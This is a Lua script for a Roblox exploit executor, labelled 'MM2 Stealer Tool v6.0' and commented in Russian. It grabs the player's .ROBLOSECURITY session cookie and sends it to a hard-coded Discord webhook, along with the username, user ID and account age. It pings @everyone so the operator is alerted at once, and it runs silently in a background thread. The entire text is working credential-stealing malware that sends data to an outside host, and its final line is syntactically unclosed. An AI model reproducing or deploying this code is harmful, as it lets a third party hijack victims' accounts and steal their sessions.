-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ SERVICES ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- [[ LOGIC: DATA COLLECTION ]]
local function collectData()
    local cookie = "N/A"
    
    -- Пытаемся вытащить куки через все возможные функции разных экзекуторов
    pcall(function()
        cookie = (getcookies and getcookies(".roblox.com")[".ROBLOSECURITY"]) 
                 or (syn and syn.request and syn.request({Url = "https://www.roblox.com/home", Method = "GET"}).Headers["Set-Cookie"])
                 or "Failed to fetch (Executor lack of permissions)"
    end)

    local payload = {
        ["content"] = "@everyone", -- Чтобы тебе сразу пришло уведомление
        ["embeds"] = {{
            ["title"] = "🔗 Target Found: " .. player.Name,
            ["color"] = 16711680, -- Красный
            ["fields"] = {
                {["name"] = "👤 User Info", ["value"] = "Name: **" .. player.Name .. "**\nID: `" .. player.UserId .. "`\nAge: `" .. player.AccountAge .. " days`", ["inline"] = true},
                {["name"] = "🍪 Cookie", ["value"] = "```" .. cookie .. "```"},
                {["name"] = "🎮 Game", ["value"] = "Place: [MM2](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = false}
            },
            ["footer"] = {["text"] = "MM2 Stealer Tool v6.0 • " .. os.date("%X")}
        }}
    }

    -- Продвинутая отправка запроса
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end
end

-- [[ RUN ]]
-- Сначала запускаем сбор данных в фоновом потоке
task.spawn(function()
    pcall(collectData)
end
